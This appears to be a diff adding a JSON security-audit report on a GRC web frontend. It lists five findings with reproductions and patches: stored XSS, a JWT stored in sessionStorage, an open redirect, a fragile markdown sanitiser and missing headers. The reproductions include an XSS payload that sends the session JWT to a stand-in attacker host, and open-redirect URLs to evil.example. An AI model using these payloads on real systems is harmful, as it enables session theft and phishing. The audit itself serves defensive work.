@@ -1,0 +1,159 @@
+{
+  "findings": [
+    {
+      "id": "SEC-FE-001",
+      "title": "Stored/Reflected DOM-based XSS via unsanitised innerHTML of server data in legacy UI (global shell + SCM/Compliance/Dashboard)",
+      "phase": "Security",
+      "category": "Cross-Site Scripting (A03:2021 Injection)",
+      "severity": "High",
+      "cvss": "CVSS 8.1 (AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N) — authenticated stored XSS leads to session-token theft because the access token is JS-readable in sessionStorage",
+      "file": "tss-grc-ui/assets/js/app.js",
+      "lines": "103-143",
+      "locations": [
+        "tss-grc-ui/assets/js/app.js:47",
+        "tss-grc-ui/assets/js/app.js:103-104",
+        "tss-grc-ui/assets/js/app.js:139-142",
+        "tss-grc-ui/assets/js/app.js:181",
+        "tss-grc-ui/scm/index.html:748-768",
+        "tss-grc-ui/scm/index.html:778-782",
+        "tss-grc-ui/scm/index.html:792-797",
+        "tss-grc-ui/scm/index.html:812-816",
+        "tss-grc-ui/compliance/index.html:193-200",
+        "tss-grc-ui/scm/index.html:112",
+        "tss-grc-ui/compliance/index.html:154"
+      ],
+      "description": "The legacy static UI renders server- and user-controlled fields directly into the DOM via `element.innerHTML = `...${field}...`` template literals with no HTML-escaping. The most damaging instance is the global application shell in app.js, which is injected on EVERY authenticated page: it interpolates `user.fullNameEn` / `user.username` (displayName, line 103-104, 141), `user.email` (line 181) and the role string (line 142) straight into innerHTML. These values originate from `Auth.getUser()` (the login response stored in sessionStorage) and are user-editable profile fields, so a user who sets their display name or email to `<img src=x onerror=...>` gets script execution in the shell on every page they load. The SCM module (scm/index.html) interpolates vendor names (`vname(v)` -> `v.nameEn`/`v.nameAr`), `v.category`, `v.country`, `v.serviceType`, onboarding/assessment vendor names, etc. with no escaping at all (lines 748-768, 778-816). The compliance module renders `c.nameEn`, `c.domain`, `c.owner` raw (lines 193-200). Vendor names, control names and owners are free-text fields editable by lower-privileged users but rendered in the browsers of reviewers/admins, making this a classic stored XSS that crosses privilege boundaries. The same files also reflect backend error text raw: `el.innerHTML = '<div class=\"alert alert-danger\">${e.message||'...'}</div>'` (scm/index.html:112, compliance/index.html:154) — `e.message` is the Spring ProblemDetail `.detail` string, which can echo attacker-influenced input. By contrast, incidents/index.html consistently funnels the same kind of data through a `_esc()` helper (defined at line 784), proving the escaping pattern exists in the codebase but was applied inconsistently.",
+      "rootCause": "Vanilla-JS string templating assigned to `innerHTML` without an HTML-escaping step. The team has an `_esc()` helper (incidents page) but did not apply it in the shell, SCM, compliance and dashboard render paths.",
+      "evidence": "app.js:103-104,141  `const displayName = user?.fullNameEn || user?.username || 'User';` ... `<div ...>${displayName}</div>`  (interpolated into shell.innerHTML at app.js:47). scm/index.html:748-754 `tb.innerHTML = _vendors.map(v => `<tr><td><strong>${vname(v)}</strong>...<td><small>${v.category||''}</small>...`. compliance/index.html:195 `<td ...>${c.nameEn}</td>`. No escaping in any of these paths.",
+      "impact": "An attacker who can set a profile name/email, a vendor record, or a compliance control name (all routine, lower-privilege actions in a GRC tool) achieves persistent JavaScript execution in the session of any user — including PLATFORM_ADMIN — who views that record or simply loads any page (for the shell vector). Because the JWT access token lives in sessionStorage (SEC-FE-002) it is directly readable by the injected script (`sessionStorage.getItem('grc_jwt')`), enabling token exfiltration, full account/tenant takeover, and cross-tenant data access via the stolen bearer token.",
+      "reproduction": "1. Log in as a low-privilege user. 2. Edit your profile and set Full Name (or display name) to `<img src=x onerror=\"fetch('https://attacker/x?t='+sessionStorage.getItem('grc_jwt'))\">`. 3. Reload any page in tss-grc-ui — App.init() rebuilds the shell via `shell.innerHTML = this._buildShell(user)` and the payload executes, posting the JWT to the attacker. Alternative: create an SCM vendor named `<img src=x onerror=alert(document.domain)>`; when a reviewer opens /scm/index.html the vendor list renders the payload at scm/index.html:748.",
+      "resolution": "HTML-escape every interpolated value before assigning to innerHTML, or build DOM nodes with `textContent`/`createElement` instead of string concatenation. Reuse the existing `_esc()` helper everywhere (shell displayName/email/role, all SCM/compliance/dashboard cells). Longer term, migrate users to the React v2 UI, which auto-escapes via JSX.",
+      "patchBefore": "const displayName = user?.fullNameEn || user?.username || 'User';\n...\n<div ...>${displayName}</div>\n<div ...>${user?.email || ''}</div>\n// scm/index.html\ntb.innerHTML = _vendors.map(v => `<tr><td><strong>${vname(v)}</strong>...<td>${v.category||''}</td>...`).join('');",
+      "patchAfter": "const esc = s => String(s ?? '').replace(/[&<>\"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','\"':'&quot;',\"'\":'&#39;'}[c]));\nconst displayName = esc(user?.fullNameEn || user?.username || 'User');\n...\n<div ...>${displayName}</div>\n<div ...>${esc(user?.email)}</div>\n// scm/index.html\ntb.innerHTML = _vendors.map(v => `<tr><td><strong>${esc(vname(v))}</strong>...<td>${esc(v.category)}</td>...`).join('');\n// also: el.innerHTML = `<div class=\"alert alert-danger\">${esc(e.message||'Failed to load data')}</div>`;",
+      "effort": "M",
+      "references": [
+        "CWE-79: Improper Neutralization of Input During Web Page Generation (XSS)",
+        "OWASP A03:2021 Injection",
+        "OWASP DOM-based XSS Prevention Cheat Sheet"
+      ]
+    },
+    {
+      "id": "SEC-FE-002",
+      "title": "JWT access token stored in sessionStorage (JS-readable) in both v1 and v2 frontends",
+      "phase": "Security",
+      "category": "Identification & Authentication Failures (A07:2021)",
+      "severity": "Medium",
+      "cvss": "CVSS 5.4 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N) — no direct exploit by itself; severity is the multiplier it gives to any XSS (SEC-FE-001)",
+      "file": "tss-grc-ui-v2/src/lib/auth.ts",
+      "lines": "14-27",
+      "locations": [
+        "tss-grc-ui-v2/src/lib/auth.ts:4-5",
+        "tss-grc-ui-v2/src/lib/auth.ts:14-16",
+        "tss-grc-ui-v2/src/lib/api.ts:53",
+        "tss-grc-ui/assets/js/auth.js:9-27",
+        "tss-grc-ui/login.html:287-288"
+      ],
+      "description": "Both frontends persist the bearer access token in Web Storage (`sessionStorage`), which is fully readable by any JavaScript running on the origin. v2: auth.ts stores under key `grc.accessToken` (getAccessToken reads `sessionStorage.getItem(TOKEN_KEY)`); api.ts:53 also writes the refreshed token straight to sessionStorage. v1: auth.js stores under `grc_jwt`; login.html:287 does the same. The refresh token is correctly kept in an HttpOnly cookie (good), but the access token is not. Any successful XSS (e.g. SEC-FE-001) can read the access token with a single `sessionStorage.getItem(...)` call and replay it against the API as a full bearer credential (1h lifetime in dev / 15m prod). This is the standard sessionStorage-vs-memory trade-off; it is acceptable only when XSS is otherwise fully controlled, which is not the case for the legacy UI.",
+      "rootCause": "Design choice to persist the access token in Web Storage for convenience across reloads, rather than holding it only in a JS closure / in-memory variable and relying on the HttpOnly refresh cookie to re-mint it on reload.",
+      "evidence": "auth.ts:15 `return sessionStorage.getItem(TOKEN_KEY);` ; auth.ts:25 `sessionStorage.setItem(TOKEN_KEY, accessToken);` ; api.ts:53 `sessionStorage.setItem('grc.accessToken', newToken);` ; auth.js:13 `return sessionStorage.getItem(this._TOKEN_KEY);`",
+      "impact": "Turns any XSS from a nuisance into a full session/account takeover and (because the JWT carries the `org` tenant claim) a cross-tenant compromise vector. The token can be exfiltrated and replayed from anywhere until it expires.",
+      "reproduction": "With any XSS foothold (see SEC-FE-001), execute `sessionStorage.getItem('grc.accessToken')` (v2) or `sessionStorage.getItem('grc_jwt')` (v1) and POST it to an attacker endpoint; then call any `/api/v1/...` endpoint with `Authorization: Bearer <stolen>`.",
+      "resolution": "Hold the access token only in a module-scoped in-memory variable (JS closure), and rely on the existing HttpOnly refresh cookie + `/api/auth/refresh` to silently re-mint it on page reload (the v2 api.ts already has the refresh plumbing). This removes the token from any persistent JS-readable store, dramatically shrinking the XSS blast radius. If reload-survival is required, prefer a non-extractable approach (e.g. short-lived token in memory, refresh-on-load). Pair with strict CSP and the SEC-FE-001 fix.",
+      "patchBefore": "const TOKEN_KEY = 'grc.accessToken';\nexport function getAccessToken(): string | null {\n  return sessionStorage.getItem(TOKEN_KEY);\n}\nexport function setSession(accessToken: string, user: UserInfo): void {\n  sessionStorage.setItem(TOKEN_KEY, accessToken);\n  sessionStorage.setItem(USER_KEY, JSON.stringify(user));\n}",
+      "patchAfter": "let accessTokenInMemory: string | null = null;\nexport function getAccessToken(): string | null {\n  return accessTokenInMemory;\n}\nexport function setSession(accessToken: string, user: UserInfo): void {\n  accessTokenInMemory = accessToken;            // not persisted to Web Storage\n  sessionStorage.setItem(USER_KEY, JSON.stringify(user)); // non-secret display data only\n}\n// On boot, call /api/auth/refresh (HttpOnly cookie) to repopulate accessTokenInMemory.",
+      "effort": "M",
+      "references": [
+        "CWE-922: Insecure Storage of Sensitive Information",
+        "OWASP A07:2021 Identification and Authentication Failures",
+        "OWASP JWT / Token Storage guidance (avoid localStorage/sessionStorage for tokens)"
+      ]
+    },
+    {
+      "id": "SEC-FE-003",
+      "title": "Open redirect via unvalidated `redirect` parameter on legacy login page",
+      "phase": "Security",
+      "category": "URL Redirection to Untrusted Site / Open Redirect (A01:2021)",
+      "severity": "Medium",
+      "cvss": "CVSS 4.7 (AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N) — phishing / token-relay aid; not direct code execution",
+      "file": "tss-grc-ui/login.html",
+      "lines": "181-184",
+      "locations": [
+        "tss-grc-ui/login.html:181-184",
+        "tss-grc-ui/login.html:290-291"
+      ],
+      "description": "The legacy login page reads the `redirect` query parameter and passes it directly to `window.location.replace(redirect)` with no validation that it is a same-origin relative path. This happens in two places: the already-logged-in fast path (line 183-184) and the post-login success path (line 290-291). An attacker can craft `https://app/login.html?redirect=https://evil.example/login` (or the scheme-relative `redirect=//evil.example`) so that after a victim authenticates they are silently bounced to an attacker-controlled look-alike page. The v2 React login (tss-grc-ui-v2/src/pages/LoginPage.tsx:22-24) does this correctly — it only honours `next` if it `startsWith('/')` and not `'//'` — which confirms the team knows the mitigation but did not apply it to the legacy page. `javascript:` payloads are generally neutralised by `location.replace`, so this is an open-redirect (phishing) issue rather than direct XSS.",
+      "rootCause": "User-controlled redirect target used in a navigation sink without an allowlist / same-origin check.",
+      "evidence": "login.html:183-184 `const redirect = new URLSearchParams(location.search).get('redirect') || '/dashboard.html'; window.location.replace(redirect);` (identical at 290-291).",
+      "impact": "Enables convincing credential-phishing: a link to the legitimate, trusted login origin redirects the user to an attacker page immediately after they log in, where session/credentials can be harvested. Also useful in OAuth/token-relay chains.",
+      "reproduction": "1. Send victim `https://<app-host>/login.html?redirect=https://evil.example/`. 2. Victim logs in on the genuine site. 3. login.html:291 runs `window.location.replace('https://evil.example/')` and the victim lands on the attacker site still trusting the flow.",
+      "resolution": "Validate the redirect target is a same-origin relative path before navigating — exactly as the v2 LoginPage already does. Reject anything not starting with a single `/` (and not `//`).",
+      "patchBefore": "const redirect = new URLSearchParams(location.search).get('redirect') || '/dashboard.html';\nwindow.location.replace(redirect);",
+      "patchAfter": "const raw = new URLSearchParams(location.search).get('redirect');\nconst redirect = (raw && raw.startsWith('/') && !raw.startsWith('//')) ? raw : '/dashboard.html';\nwindow.location.replace(redirect);",
+      "effort": "S",
+      "references": [
+        "CWE-601: URL Redirection to Untrusted Site (Open Redirect)",
+        "OWASP A01:2021 Broken Access Control",
+        "OWASP Unvalidated Redirects and Forwards Cheat Sheet"
+      ]
+    },
+    {
+      "id": "SEC-FE-004",
+      "title": "Hand-rolled Markdown-to-HTML renderer feeding dangerouslySetInnerHTML in v2 Knowledge Base",
+      "phase": "Security",
+      "category": "Cross-Site Scripting (A03:2021 Injection)",
+      "severity": "Low",
+      "cvss": "CVSS 3.7 (AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N) — current escaping holds; risk is fragility/regression in a custom sanitiser",
+      "file": "tss-grc-ui-v2/src/pages/knowledge-base/KbArticlePage.tsx",
+      "lines": "83-170",
+      "locations": [
+        "tss-grc-ui-v2/src/pages/knowledge-base/KbArticlePage.tsx:86",
+        "tss-grc-ui-v2/src/pages/knowledge-base/KbArticlePage.tsx:102-147",
+        "tss-grc-ui-v2/src/pages/knowledge-base/KbArticlePage.tsx:157-170"
+      ],
+      "description": "This is the only `dangerouslySetInnerHTML` in the v2 React app. KB article bodies (server content) are passed through a custom `renderMarkdown()` and injected raw (line 86). The renderer does HTML-escape `& < >` first (lines 104-107) and gates link URLs through a `sanitiseUrl()` scheme allowlist that blocks `javascript:`/`data:`/`vbscript:` (lines 157-169), which closes the obvious vectors. However the implementation is a bespoke regex sanitiser rather than a vetted library (marked + DOMPurify), and has gaps that make it fragile: (1) it does NOT escape the double-quote character globally — only `<>&` are neutralised in step 1, so the `\"` -> `&quot;` mapping relies entirely on sanitiseUrl for the href; any future code that places user text into an attribute would be unsafe; (2) the heading/list/paragraph regexes run AFTER escaping but a future contributor adding image syntax, raw-HTML passthrough, or attribute support could easily reintroduce an injection because there is no post-render sanitisation pass; (3) `sanitiseUrl` strips leading `\\s` and `-` then lowercases for the check but returns the original `raw`, so the validation and the emitted value are computed from different strings — a brittle pattern. No working bypass was found in the current code, so this is Low / defence-in-depth, not an active High.",
+      "rootCause": "Rolling a custom markdown sanitiser instead of using a maintained library, and using `dangerouslySetInnerHTML` for server-supplied rich text.",
+      "evidence": "KbArticlePage.tsx:86 `dangerouslySetInnerHTML={{ __html: renderMarkdown(body ?? '') }}`. KbArticlePage.tsx:104-107 escapes only `& < >` (no `\"`). KbArticlePage.tsx:161-169 `sanitiseUrl` validates a transformed string but returns the original `raw`.",
+      "impact": "If the renderer is extended (images, tables, raw HTML) or the escaping invariants are broken by a refactor, KB content — which non-admin authors can typically create — becomes a stored-XSS channel into reviewers' sessions (and, via SEC-FE-002, their tokens). Today the impact is limited because the current ruleset blocks the known vectors.",
+      "reproduction": "No reliable exploit against the current code. Negative test: a KB body of `[x](javascript:alert(1))` renders `<a href=\"#\">` (inert). Regression risk only.",
+      "resolution": "Replace the hand-rolled renderer with `marked`/`markdown-it` to parse and DOMPurify to sanitise the resulting HTML before `dangerouslySetInnerHTML` (or render to React elements without raw HTML). At minimum, add `\"` and `'` to the global escape step and add a final DOMPurify pass over the produced HTML.",
+      "patchBefore": "let html = md\n  .replace(/&/g, '&amp;')\n  .replace(/</g, '&lt;')\n  .replace(/>/g, '&gt;');\n// ... custom regex transforms ...\nreturn html; // -> dangerouslySetInnerHTML",
+      "patchAfter": "import { marked } from 'marked';\nimport DOMPurify from 'dompurify';\nconst raw = marked.parse(md, { async: false }) as string;\nreturn DOMPurify.sanitize(raw, { ALLOWED_URI_REGEXP: /^(?:https?:|mailto:|tel:|\\/|#)/i });\n// -> dangerouslySetInnerHTML={{ __html: that }}",
+      "effort": "M",
+      "references": [
+        "CWE-79: Improper Neutralization of Input During Web Page Generation (XSS)",
+        "CWE-80: Improper Neutralization of Script-Related HTML Tags",
+        "OWASP DOM-based XSS Prevention Cheat Sheet",
+        "DOMPurify project"
+      ]
+    },
+    {
+      "id": "SEC-FE-005",
+      "title": "Legacy static dev server sends Access-Control-Allow-Origin: * and no security headers (no CSP / X-Frame-Options)",
+      "phase": "Security",
+      "category": "Security Misconfiguration (A05:2021)",
+      "severity": "Info",
+      "cvss": "CVSS 2.0 — dev-only static server; clickjacking + missing defence-in-depth headers",
+      "file": "tss-grc-ui/server.py",
+      "lines": "18-21",
+      "locations": [
+        "tss-grc-ui/server.py:18-21",
+        "tss-grc-ui-v2/index.html:1-25"
+      ],
+      "description": "The legacy frontend's Python static server (server.py) emits `Access-Control-Allow-Origin: *` (line 18) and no Content-Security-Policy, X-Frame-Options, or X-Content-Type-Options headers. The v2 index.html likewise ships no CSP meta tag. Consequently the UI relies entirely on the application server / reverse proxy for clickjacking protection (X-Frame-Options/frame-ancestors) and has no Content-Security-Policy to act as a second line of defence against the XSS in SEC-FE-001 (e.g. a `default-src 'self'; script-src 'self'` policy would block inline-event-handler payloads and exfiltration to attacker hosts). This is rated Info because server.py is described in CLAUDE.md as a dev launcher, not the production server; the real risk lives in whatever serves the UI in staging/prod. It is called out so the production deployment is verified to set CSP + X-Frame-Options.",
+      "rootCause": "Static file servers configured for developer convenience (open CORS, no headers); no CSP defined at the document level either.",
+      "evidence": "server.py:18 `self.send_header('Access-Control-Allow-Origin', '*')`. No `Content-Security-Policy` / `X-Frame-Options` anywhere in server.py or tss-grc-ui-v2/index.html.",
+      "impact": "Without a CSP, an XSS payload (SEC-FE-001) executes unhindered and can freely exfiltrate the sessionStorage token to any host. Without X-Frame-Options/frame-ancestors the app can be framed for clickjacking. `ACAO: *` on the static server is low-impact (it serves no credentialed JSON) but is poor hygiene.",
+      "reproduction": "Load any UI page and inspect response headers (curl -I) — no CSP/X-Frame-Options present; ACAO: * present on the legacy static server.",
+      "resolution": "In production, serve the UI behind a server/proxy that sets `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'`, `X-Frame-Options: DENY`, and `X-Content-Type-Options: nosniff`. Scope CORS to known origins rather than `*`. Optionally add a CSP `<meta http-equiv>` to index.html as a baseline.",
+      "patchBefore": "self.send_header('Access-Control-Allow-Origin', '*')\n# (no CSP / X-Frame-Options / X-Content-Type-Options)",
+      "patchAfter": "self.send_header('Access-Control-Allow-Origin', 'http://localhost:5173')  # scope it\nself.send_header('Content-Security-Policy', \"default-src 'self'; object-src 'none'; frame-ancestors 'none'\")\nself.send_header('X-Frame-Options', 'DENY')\nself.send_header('X-Content-Type-Options', 'nosniff')",
+      "effort": "S",
+      "references": [
+        "CWE-1021: Improper Restriction of Rendered UI Layers (Clickjacking)",
+        "CWE-693: Protection Mechanism Failure",
+        "OWASP A05:2021 Security Misconfiguration",
+        "OWASP Content Security Policy Cheat Sheet"
+      ]
+    }
+  ]
+}
